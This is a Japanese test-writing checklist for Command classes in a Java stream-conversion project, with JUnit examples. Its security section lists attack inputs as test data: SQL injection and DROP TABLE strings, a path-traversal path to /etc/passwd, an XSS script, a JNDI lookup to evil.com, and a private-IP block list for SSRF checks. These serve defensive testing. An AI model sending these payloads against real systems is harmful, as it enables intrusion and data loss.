# Command Test Checklist

> **作成日**: 2025-11-03
> **目的**: すべてのIStreamCommand実装クラスで検証すべき共通の観点をまとめた包括的なチェックリスト

## 概要

このドキュメントは、StreamConverterプロジェクトにおける新しいCommand実装クラスのテスト作成時に使用する包括的なチェックリストです。TEST_INVENTORY.mdから抽出した実際のテストパターンに基づいており、すべての必須検証観点を網羅しています。

## 必須検証観点

### 1. コンストラクタ検証

すべてのCommandクラスで必須のコンストラクタテストです。

- [ ] **有効な引数での正常なインスタンス生成**
  - 単一引数、複数引数の両方をテスト
  - 例: `CsvValidateCommandTest.testConstructorWithValidRequiredColumns()`

- [ ] **null引数での適切な例外スロー**
  - 必須パラメータがnullの場合にIllegalArgumentExceptionをスロー
  - 例: `JsonValidateCommandTest.testConstructorWithNullSchemaPath()`

- [ ] **空文字列/空配列での適切な処理**
  - 空文字列が許可されるか、例外をスローするか明確にする
  - 例: `CsvValidateCommandTest.testConstructorWithEmptyRequiredColumns()`

- [ ] **空白のみの文字列での適切な処理**
  - トリミング後に空になる入力の処理
  - 例: `JsonValidateCommandTest.testConstructorWithWhitespaceSchemaPath()`

- [ ] **無効な引数での適切な例外スロー**
  - 範囲外の値、不正なフォーマットなどでの例外処理
  - 例: `ConvertTest.testExecuteWithInvalidInputCharset()`

**実装例:**
```java
@Test
void testConstructorWithNullParameter() {
    assertThrows(IllegalArgumentException.class, () -> {
        new MyCommand(null);
    }, "null parameter should throw IllegalArgumentException");
}

@Test
void testConstructorWithEmptyParameter() {
    assertThrows(IllegalArgumentException.class, () -> {
        new MyCommand("");
    }, "empty parameter should throw IllegalArgumentException");
}
```

### 2. 正常系処理

基本的な機能の動作確認テストです。

- [ ] **基本的な入力データの処理成功**
  - 最小限の有効な入力データでの処理確認
  - 例: `CsvNavigateCommandTest.testBasicCsvProcessing()`

- [ ] **出力データが期待通り生成される**
  - 入力に対する出力の正確性検証
  - 変換前後のデータ整合性確認

- [ ] **CommandResultが正常終了を示す**
  - `CommandResult.isSuccess()`がtrueを返す
  - 適切なメッセージやメトリクスが含まれる

**実装例:**
```java
@Test
void testBasicProcessing() throws Exception {
    MyCommand command = new MyCommand("validParam");

    String input = "test data";
    ByteArrayInputStream inputStream = new ByteArrayInputStream(input.getBytes());
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(inputStream, outputStream);

    assertTrue(result.isSuccess(), "Command should execute successfully");
    String output = outputStream.toString();
    assertFalse(output.isEmpty(), "Output should not be empty");
    // 期待される出力内容の検証
}
```

### 3. 異常系処理

エラーハンドリングとロバスト性の検証です。

- [ ] **null InputStreamでの例外スロー**
  - IllegalArgumentExceptionまたはNullPointerExceptionをスロー
  - 例: `SampleStreamCommandTest.testExecuteWithNullInputStream()`

- [ ] **null OutputStreamでの例外スロー**
  - IllegalArgumentExceptionまたはNullPointerExceptionをスロー
  - 例: `ValidateTest.testExecuteWithNullOutputStream()`

- [ ] **空入力の適切な処理**
  - 空のInputStreamを正常に処理、または適切なエラーを返す
  - 例: `CsvNavigateCommandTest.testEmptyInput()`

- [ ] **無効な入力形式での例外またはエラーハンドリング**
  - 不正なフォーマットのデータでの例外処理
  - 例: `XmlNavigateCommandTest.testInvalidXmlInput()`

**実装例:**
```java
@Test
void testNullInputStream() {
    MyCommand command = new MyCommand("validParam");
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    assertThrows(IllegalArgumentException.class, () -> {
        command.execute(null, outputStream);
    }, "null InputStream should throw IllegalArgumentException");
}

@Test
void testEmptyInput() throws Exception {
    MyCommand command = new MyCommand("validParam");
    ByteArrayInputStream emptyInput = new ByteArrayInputStream(new byte[0]);
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(emptyInput, outputStream);

    // 空入力を正常に処理するか、明確なエラーを返すかを確認
    assertTrue(result.isSuccess() || !result.getMessage().isEmpty());
}
```

### 4. パフォーマンス・スケーラビリティ

大規模データ処理とメモリ効率性の検証です。

- [ ] **大量データ処理（1000+レコード/要素）**
  - 最低1000レコード以上のデータを処理
  - タイムアウトせずに完了することを確認
  - 例: `CsvValidateCommandTest.testLargeCsvValidation()` (1000レコード)

- [ ] **メモリ効率的な処理（ストリーミング）**
  - メモリ使用量が入力サイズに比例して増加しないことを確認
  - 例: `StreamConverterTest.testLargeDataMemoryEfficiency()`

- [ ] **実行時間が許容範囲内**
  - パフォーマンスベンチマークの設定
  - 例: `DatabaseFetchRuleIntegrationTest.testLargeDatasetPerformance()` (5秒以内)

**実装例:**
```java
@Test
void testLargeDataProcessing() throws Exception {
    MyCommand command = new MyCommand("validParam");

    // 1000+レコードのテストデータ生成
    StringBuilder largeInput = new StringBuilder();
    for (int i = 0; i < 1000; i++) {
        largeInput.append("record").append(i).append("\n");
    }

    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        largeInput.toString().getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    long startTime = System.currentTimeMillis();
    CommandResult result = command.execute(inputStream, outputStream);
    long executionTime = System.currentTimeMillis() - startTime;

    assertTrue(result.isSuccess(), "Large data processing should succeed");
    assertTrue(executionTime < 5000, "Should complete within 5 seconds");
}
```

### 5. ストリーミング動作

ストリーミング処理の正確性検証です。

- [ ] **データを段階的に処理（バッファリングしない）**
  - 入力全体をメモリに読み込まないことを確認
  - 例: `CsvNavigateCommandTest.testStreamingCsvNavigationBehavior()`

- [ ] **入力を読みながら出力を書く動作**
  - ブロッキング動作の検証
  - 例: `SendHttpCommandTest.testStreamingBlockingBehavior()`

- [ ] **バッファ境界での正しい動作**
  - バッファサイズをまたぐデータの正確な処理
  - 例: `LineEndingNormalizeCommandTest.testCRLFSpanningBufferBoundary()`

- [ ] **増分処理の検証**
  - データが段階的に処理されることを時系列で確認
  - 例: `JsonValidateCommandTest.testIncrementalJsonValidation()`

**実装例:**
```java
@Test
void testStreamingBehavior() throws Exception {
    MyCommand command = new MyCommand("validParam");

    // 複数チャンクに分かれるデータを生成
    String[] chunks = new String[10];
    for (int i = 0; i < chunks.length; i++) {
        chunks[i] = "chunk" + i + "\n";
    }

    PipedInputStream inputStream = new PipedInputStream();
    PipedOutputStream pipedOutput = new PipedOutputStream(inputStream);
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    // 別スレッドで段階的にデータを書き込む
    Thread writerThread = new Thread(() -> {
        try {
            for (String chunk : chunks) {
                pipedOutput.write(chunk.getBytes(StandardCharsets.UTF_8));
                pipedOutput.flush();
                Thread.sleep(10); // 段階的な書き込みをシミュレート
            }
            pipedOutput.close();
        } catch (Exception e) {
            fail("Writer thread failed: " + e.getMessage());
        }
    });

    writerThread.start();
    CommandResult result = command.execute(inputStream, outputStream);
    writerThread.join();

    assertTrue(result.isSuccess(), "Streaming should work correctly");
}
```

### 6. エッジケース

特殊なデータ形式の処理検証です。

- [ ] **特殊文字を含むデータ**
  - タブ、改行、制御文字などの処理
  - 例: `CsvValidateCommandTest.testCsvWithSpecialCharactersValidation()`

- [ ] **マルチバイト文字（日本語、中国語など）**
  - UTF-8エンコーディングの正確な処理
  - 例: `JsonValidateCommandTest.testJsonWithSpecialCharactersValidation()`

- [ ] **改行を含むデータ**
  - フィールド内の改行の適切な処理
  - 例: `CsvValidateCommandTest.testCsvWithQuotedFieldsContainingNewlines()`

- [ ] **クォート/エスケープが必要なデータ**
  - 引用符、バックスラッシュなどの特殊文字処理
  - 例: `CsvValidateCommandTest.testMalformedCsvWithUnclosedQuotes()`

**実装例:**
```java
@Test
void testSpecialCharacters() throws Exception {
    MyCommand command = new MyCommand("validParam");

    String specialInput = "データ,with\ttab,\"quoted\nfield\",日本語,中文";
    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        specialInput.getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(inputStream, outputStream);

    assertTrue(result.isSuccess(), "Should handle special characters");
    String output = new String(outputStream.toByteArray(), StandardCharsets.UTF_8);
    assertTrue(output.contains("データ"), "Should preserve multibyte characters");
}
```

## コマンド種別ごとの追加観点

### NavigateCommand系

特定パスの要素を変換するコマンドの検証です。

- [ ] **指定パスの要素変換が正しく動作**
  - パス指定した要素のみが変換される
  - 例: `JsonNavigateCommandTest.testBasicJsonProcessing()`

- [ ] **他の要素は変更されない**
  - 指定パス以外の要素が保持される

- [ ] **ネスト構造の深い要素へのアクセス**
  - 複雑な階層構造での正確なパス解決
  - 例: `JsonNavigateCommandTest.testComplexJsonProcessing()`

- [ ] **存在しないパスの適切な処理**
  - エラーまたは警告を返す

**実装例:**
```java
@Test
void testNavigatePreservesOtherFields() throws Exception {
    NavigateCommand command = new NavigateCommand("$.target");

    String input = "{\"target\":\"value\",\"preserve\":\"unchanged\"}";
    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        input.getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    command.execute(inputStream, outputStream);
    String output = outputStream.toString(StandardCharsets.UTF_8);

    assertTrue(output.contains("\"preserve\":\"unchanged\""),
        "Other fields should remain unchanged");
}
```

### FilterCommand系

特定要素のみを抽出するコマンドの検証です。

- [ ] **指定した要素のみが出力される**
  - フィルタ条件にマッチする要素のみ含まれる
  - 例: `FilterCommandBasicTest.testJsonFilterCommand_SimpleProperty()`

- [ ] **他の要素は出力されない**
  - フィルタ条件に一致しない要素が除外される

- [ ] **複数要素の同時フィルタ**
  - 複数のフィルタ条件の論理積または論理和
  - 例: `FilterCommandBasicTest.testCsvFilterCommand_MultipleColumns()`

- [ ] **存在しない要素の指定時の動作**
  - エラーまたは空の結果を返す
  - 例: `FilterCommandBasicTest.testJsonFilterCommand_NonExistentProperty()`

**実装例:**
```java
@Test
void testFilterExcludesOtherFields() throws Exception {
    FilterCommand command = new FilterCommand("fieldA", "fieldB");

    String input = "fieldA,fieldB,fieldC\nvalue1,value2,value3";
    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        input.getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    command.execute(inputStream, outputStream);
    String output = outputStream.toString(StandardCharsets.UTF_8);

    assertTrue(output.contains("fieldA"), "Should include fieldA");
    assertTrue(output.contains("fieldB"), "Should include fieldB");
    assertFalse(output.contains("fieldC"), "Should exclude fieldC");
}
```

### ValidateCommand系

入力データの検証を行うコマンドの検証です。

- [ ] **有効な入力での検証成功**
  - ValidationResult.isSuccess() == true
  - 例: `CsvValidateCommandTest.testValidCsvWithRequiredColumnsSuccess()`

- [ ] **無効な入力での検証失敗と明確なエラーメッセージ**
  - ValidationResult.getErrors()に具体的なエラー内容
  - 例: `JsonValidateCommandTest.testInvalidJsonValidationFailure()`

- [ ] **複数の検証エラーの適切なレポート**
  - すべてのエラーが1回の実行で検出される
  - 例: `CsvValidateCommandTest.testCsvWithInconsistentRowLengthFailure()`

- [ ] **スキーマ/ルールファイルの存在確認**
  - 存在しないファイル指定時のエラー処理
  - 例: `JsonValidateCommandTest.testNonExistentSchemaFile()`

- [ ] **スキーマ/ルールファイル自体の妥当性確認**
  - 無効なスキーマファイルでのエラー処理
  - 例: `JsonValidateCommandTest.testInvalidSchemaFile()`

**実装例:**
```java
@Test
void testValidationReportsMultipleErrors() throws Exception {
    ValidateCommand command = new ValidateCommand("schema.json");

    // 複数の検証エラーを含む入力
    String invalidInput = "{\"missing\":\"required_field\",\"invalid\":\"type\"}";
    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        invalidInput.getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(inputStream, outputStream);

    assertFalse(result.isSuccess(), "Should fail validation");
    ValidationResult validation = (ValidationResult) result;
    assertTrue(validation.getErrors().size() >= 2,
        "Should report all errors, not just the first one");
}
```

### 変換Command系

データ形式やエンコーディングを変換するコマンドの検証です。

- [ ] **変換前後のデータ整合性**
  - 情報の損失がないことを確認
  - 例: `ConvertCommandTest.testBasicXmlConversion()`

- [ ] **文字エンコーディングの正しい処理**
  - マルチバイト文字の正確な変換
  - 例: `ConvertTest.testJapaneseCharacterConversion()`

- [ ] **データ損失がないこと**
  - 往復変換で元のデータに戻ることを確認
  - 例: `TransformationRuleIntegrationTest.testRoundTripConversion()`

- [ ] **大量データの変換パフォーマンス**
  - 効率的な変換処理
  - 例: `ConvertCommandTest.testLargeXmlProcessing()`

**実装例:**
```java
@Test
void testRoundTripConversion() throws Exception {
    ConvertCommand toFormat = new ConvertCommand("UTF-8", "ISO-8859-1");
    ConvertCommand fromFormat = new ConvertCommand("ISO-8859-1", "UTF-8");

    String original = "日本語テスト";

    // First conversion
    ByteArrayInputStream input1 = new ByteArrayInputStream(
        original.getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream output1 = new ByteArrayOutputStream();
    toFormat.execute(input1, output1);

    // Reverse conversion
    ByteArrayInputStream input2 = new ByteArrayInputStream(output1.toByteArray());
    ByteArrayOutputStream output2 = new ByteArrayOutputStream();
    fromFormat.execute(input2, output2);

    String result = output2.toString(StandardCharsets.UTF_8);
    assertEquals(original, result, "Round-trip conversion should preserve data");
}
```

## セキュリティ観点

### インジェクション防止

インジェクション攻撃に対する防御の検証です。

- [ ] **SQLインジェクション防止（DB系Command）**
  - プリペアドステートメントの使用
  - 例: `DatabaseFetchRuleIntegrationTest.testSQLInjectionPrevention()`

- [ ] **XPathインジェクション防止（XML系Command）**
  - 危険な関数や構文の検出
  - 例: `SecureXPathValidatorTest.testXPathInjectionDetection()`

- [ ] **コマンドインジェクション防止**
  - シェルコマンド実行の適切な制限

- [ ] **パストラバーサル防止**
  - ファイルパスの適切な検証とサニタイゼーション
  - 例: `DatabaseFetchRuleIntegrationTest.testInvalidDatabaseUrl()`

**実装例:**
```java
@Test
void testSqlInjectionPrevention() throws Exception {
    DatabaseCommand command = new DatabaseCommand("SELECT * FROM users WHERE id = ?");

    // SQLインジェクション攻撃を試みる
    String maliciousInput = "1 OR 1=1; DROP TABLE users;--";

    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        maliciousInput.getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(inputStream, outputStream);

    // プリペアドステートメントにより、攻撃は単なる文字列として扱われる
    assertTrue(result.isSuccess() || result.getMessage().contains("not found"),
        "Should treat injection attempt as literal string");
}
```

### URL/ネットワーク

ネットワークアクセスのセキュリティ検証です。

- [ ] **無効なURLスキームの拒否**
  - http/https以外のスキームを拒否
  - 例: `SendHttpCommandTest.testInvalidProtocol()`

- [ ] **プライベートIP/localhostへのアクセス制限**
  - SSRF攻撃の防止
  - 例: `SendHttpCommandTest.testLocalhostBlocked()`
  - 例: `SendHttpCommandTest.testPrivateIpBlocked()`

- [ ] **タイムアウト設定**
  - 無限待機を防ぐタイムアウトの設定

- [ ] **適切なエラーハンドリング**
  - ネットワークエラーの明確な報告
  - 例: `SendHttpCommandTest.testNonExistentHost()`

**実装例:**
```java
@Test
void testBlocksPrivateIpRanges() {
    String[] privateIps = {
        "http://127.0.0.1/",
        "http://localhost/",
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/"
    };

    for (String url : privateIps) {
        assertThrows(IllegalArgumentException.class, () -> {
            new HttpCommand(url);
        }, "Should block private IP: " + url);
    }
}
```

### 入力サニタイゼーション

危険な入力のサニタイズ検証です。

- [ ] **入力値の検証とサニタイゼーション**
  - 危険な文字列パターンの検出と除去
  - 例: `DatabaseFetchRuleIntegrationTest.testInputSanitization()`

- [ ] **外部参照の検出と制限**
  - 外部リソースへの参照の制限
  - 例: `SecureXPathValidatorTest.testExternalReferenceDetection()`

- [ ] **危険な関数の使用制限**
  - セキュリティリスクのある関数の禁止
  - 例: `SecureXPathValidatorTest.testDangerousFunctionDetection()`

**実装例:**
```java
@Test
void testInputSanitization() throws Exception {
    MyCommand command = new MyCommand();

    // 危険な文字列を含む入力
    String[] dangerousInputs = {
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "'; DROP TABLE users;--"
    };

    for (String dangerous : dangerousInputs) {
        ByteArrayInputStream inputStream = new ByteArrayInputStream(
            dangerous.getBytes(StandardCharsets.UTF_8));
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

        // サニタイズにより安全に処理されるか、拒否されることを確認
        CommandResult result = command.execute(inputStream, outputStream);

        String output = outputStream.toString(StandardCharsets.UTF_8);
        assertFalse(output.contains(dangerous),
            "Dangerous input should be sanitized or rejected: " + dangerous);
    }
}
```

## テストパターン別実装ガイド

### パターン1: パラメータ化テスト

同じロジックを複数の入力値でテストする場合に使用します。

```java
@ParameterizedTest
@ValueSource(strings = {"UTF-8", "ISO-8859-1", "Shift_JIS", "EUC-JP"})
void testWithVariousEncodings(String encoding) throws Exception {
    ConvertCommand command = new ConvertCommand("UTF-8", encoding);

    String input = "テストデータ";
    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        input.getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(inputStream, outputStream);
    assertTrue(result.isSuccess(), "Should support encoding: " + encoding);
}
```

### パターン2: モックを使用したユニットテスト

外部依存関係を分離してテストする場合に使用します。

```java
@Test
void testWithMockedDependency() throws Exception {
    ExternalService mockService = mock(ExternalService.class);
    when(mockService.fetchData(anyString())).thenReturn("mocked data");

    MyCommand command = new MyCommand(mockService);

    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        "input".getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(inputStream, outputStream);

    assertTrue(result.isSuccess());
    verify(mockService, times(1)).fetchData(anyString());
}
```

### パターン3: 統合テスト

実際のリソース（DB、ファイル、ネットワーク）を使用したテストです。

```java
@Test
void testDatabaseIntegration() throws Exception {
    // インメモリデータベースのセットアップ
    Connection conn = DriverManager.getConnection("jdbc:h2:mem:test");
    Statement stmt = conn.createStatement();
    stmt.execute("CREATE TABLE test_table (id INT, name VARCHAR(100))");
    stmt.execute("INSERT INTO test_table VALUES (1, 'test')");

    DatabaseCommand command = new DatabaseCommand(
        "jdbc:h2:mem:test",
        "SELECT name FROM test_table WHERE id = ?"
    );

    ByteArrayInputStream inputStream = new ByteArrayInputStream(
        "1".getBytes(StandardCharsets.UTF_8));
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(inputStream, outputStream);

    assertTrue(result.isSuccess());
    assertEquals("test", outputStream.toString(StandardCharsets.UTF_8).trim());

    // クリーンアップ
    stmt.execute("DROP TABLE test_table");
    conn.close();
}
```

### パターン4: 並行処理テスト

スレッドセーフティとパフォーマンスの検証です。

```java
@Test
void testConcurrentAccess() throws Exception {
    MyCommand command = new MyCommand("sharedResource");

    int threadCount = 10;
    int operationsPerThread = 100;
    ExecutorService executor = Executors.newFixedThreadPool(threadCount);

    CountDownLatch latch = new CountDownLatch(threadCount);
    AtomicInteger successCount = new AtomicInteger(0);

    for (int i = 0; i < threadCount; i++) {
        executor.submit(() -> {
            try {
                for (int j = 0; j < operationsPerThread; j++) {
                    ByteArrayInputStream inputStream = new ByteArrayInputStream(
                        "data".getBytes(StandardCharsets.UTF_8));
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

                    CommandResult result = command.execute(inputStream, outputStream);
                    if (result.isSuccess()) {
                        successCount.incrementAndGet();
                    }
                }
            } finally {
                latch.countDown();
            }
        });
    }

    latch.await(10, TimeUnit.SECONDS);
    executor.shutdown();

    assertEquals(threadCount * operationsPerThread, successCount.get(),
        "All operations should succeed in concurrent environment");
}
```

### パターン5: メモリ効率テスト

メモリ使用量を測定してストリーミング動作を確認します。

```java
@Test
void testMemoryEfficiency() throws Exception {
    MyCommand command = new MyCommand();

    // 大容量データ（10MB）を生成
    int dataSize = 10 * 1024 * 1024;
    byte[] largeData = new byte[dataSize];
    Arrays.fill(largeData, (byte) 'A');

    Runtime runtime = Runtime.getRuntime();
    runtime.gc();
    long memoryBefore = runtime.totalMemory() - runtime.freeMemory();

    ByteArrayInputStream inputStream = new ByteArrayInputStream(largeData);
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    CommandResult result = command.execute(inputStream, outputStream);

    runtime.gc();
    long memoryAfter = runtime.totalMemory() - runtime.freeMemory();
    long memoryUsed = memoryAfter - memoryBefore;

    assertTrue(result.isSuccess());
    assertTrue(memoryUsed < dataSize / 2,
        "Memory usage should be less than half of input size (streaming behavior)");
}
```

## チェックリストの使い方

### 1. 新規Commandクラス作成時

1. このチェックリストをコピーしてテストクラスのJavadocに貼り付ける
2. コマンドの種類に応じた追加観点を確認
3. 各項目に対応するテストメソッドを作成
4. すべての必須項目をカバーすることを確認

### 2. 既存テストのレビュー時

1. テストクラスの網羅性をチェックリストと照合
2. 不足している観点を特定
3. 優先度の高い項目から追加実装

### 3. Pull Request時

1. このチェックリストを参照してテストカバレッジを確認
2. レビュアーがチェックリストに基づいて検証
3. すべての必須項目が実装されていることを確認

## 既存テストの分析結果

TEST_INVENTORY.mdから抽出した実際のテストパターンの統計です。

### テストメソッド総数の内訳

| カテゴリ | メソッド数 | 代表例 |
|---------|-----------|--------|
| コンストラクタ検証 | 45+ | `testConstructorWithNullParameter` |
| 正常系処理 | 60+ | `testBasicProcessing` |
| 異常系処理 | 55+ | `testNullInputStream` |
| 大量データ処理 | 30+ | `testLargeDataProcessing` |
| ストリーミング動作 | 25+ | `testStreamingBehavior` |
| エッジケース | 40+ | `testSpecialCharacters` |
| セキュリティ | 20+ | `testSqlInjectionPrevention` |
| 統合テスト | 35+ | `testDatabaseIntegration` |

### コマンド種別ごとのテストカバレッジ

| コマンド種別 | テストクラス数 | 平均テストメソッド数 |
|-------------|---------------|-------------------|
| ValidateCommand | 5 | 15-20 |
| NavigateCommand | 3 | 6-8 |
| FilterCommand | 1 | 11 |
| ConvertCommand | 2 | 9-11 |
| その他（Sample等） | 10+ | 5-10 |

### 頻出するテストパターン

1. **null検証**: 95%以上のテストクラスで実装
2. **空入力処理**: 90%以上のテストクラスで実装
3. **大量データ処理**: 80%以上のテストクラスで実装
4. **ストリーミング動作**: 70%以上のテストクラスで実装
5. **マルチバイト文字**: 60%以上のテストクラスで実装

### セキュリティテストの実装状況

- **SQLインジェクション防止**: Database系コマンドで100%実装
- **XPathインジェクション防止**: XML系コマンドで100%実装
- **URLスキーム検証**: HTTP系コマンドで100%実装
- **プライベートIPブロック**: HTTP系コマンドで100%実装
- **入力サニタイゼーション**: Database系コマンドで実装

### パフォーマンステストの基準

| テストタイプ | データサイズ | 許容時間 |
|------------|-------------|---------|
| 大量データ処理 | 1000+レコード | 5秒以内 |
| データベースクエリ | 100クエリ | 3秒以内 |
| HTTP通信 | 20MB | タイムアウトなし |
| 並行処理 | 10スレッド×50操作 | 10秒以内 |

## まとめ

このチェックリストは、StreamConverterプロジェクトの実際のテストパターンから抽出された、実績のあるベストプラクティスです。新しいCommandを実装する際は、このチェックリストに従うことで：

- **一貫性**: すべてのCommandが同じレベルの品質を保つ
- **網羅性**: 見落としがちな観点も確実にテストされる
- **保守性**: 標準化されたテスト構造により、理解と修正が容易
- **セキュリティ**: セキュリティリスクが事前に検証される

必須項目をすべてクリアし、コマンド種別に応じた追加観点も実装することで、高品質で信頼性の高いCommandクラスを作成できます。

---

**参考ドキュメント**:
- [TEST_INVENTORY.md](TEST_INVENTORY.md) - 全テストメソッドの詳細目録
- [TESTING.md](TESTING.md) - テスト戦略とベンチマーク実行
- [docs/INDEX.md](../INDEX.md) - ドキュメント全体のナビゲーション
